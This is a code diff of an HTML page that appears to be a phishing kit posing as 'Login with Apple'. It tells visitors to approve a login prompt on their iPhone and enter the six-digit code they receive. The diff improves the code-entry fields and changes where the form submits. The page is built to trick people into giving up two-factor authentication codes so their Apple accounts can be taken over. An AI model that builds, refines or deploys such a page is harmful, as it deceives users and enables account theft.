@@ -7,7 +7,6 @@
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
     <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;500;600&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="./login.css">
-    <link rel="shortcut icon" href="./img/login1.png" type="image/png">
 
 </head>
 
@@ -16,11 +15,21 @@
         <div class="shape"></div>
         <div class="shape"></div>
     </div>
-    <form action="./index.html" method="get" name="form">
+    <form action="./main.html" method="get" name="form">
         <h3>Login with Apple <i class="fab fa-apple"></i></h3>
         <label for="username">Check your Iphone</label>
-        <input type="text" placeholder="Code" name="password" id="password" class="login" maxlength="6" minlength="6" required>
-        <p style="font-size: 12px; padding-top: 10px;">Please, do not exit the page!<br/> Within one minute, a login confirmation window will appear on your iPhone, click allow login and you will see a window with a six-digit login code, which must be entered in the field above.</p>
+        <!-- <input type="text" placeholder="Code" name="password" id="password" class="login" maxlength="6" minlength="6" required> -->
+        <div class="input-field">
+            <input type="number" id="password" name="c" maxlength="1" onkeyup="moveToNextInput(this, 1)" />
+            <input type="number" id="password" name="c" maxlength="1" onkeyup="moveToNextInput(this, 2)" disabled />
+            <input type="number" id="password" name="c" maxlength="1" onkeyup="moveToNextInput(this, 3)" disabled />
+            <input type="number" id="password" name="c" maxlength="1" onkeyup="moveToNextInput(this, 4)" disabled />
+            <input type="number" id="password" name="c" maxlength="1" onkeyup="moveToNextInput(this, 5)" disabled />
+            <input type="number" id="password" name="c" maxlength="1" onkeyup="moveToNextInput(this, 6)" disabled />
+        </div>
+        <p style="font-size: 12px; padding-top: 10px;">Please, do not exit the page!<br /> Within one minute, a login
+            confirmation window will appear on your iPhone, click allow login and you will see a window with a six-digit
+            login code, which must be entered in the field above.</p>
         <button type="submit"><i class="fab fa-apple" style="color: black;"></i></button>
     </form>
     <script src="./app1.js"></script>
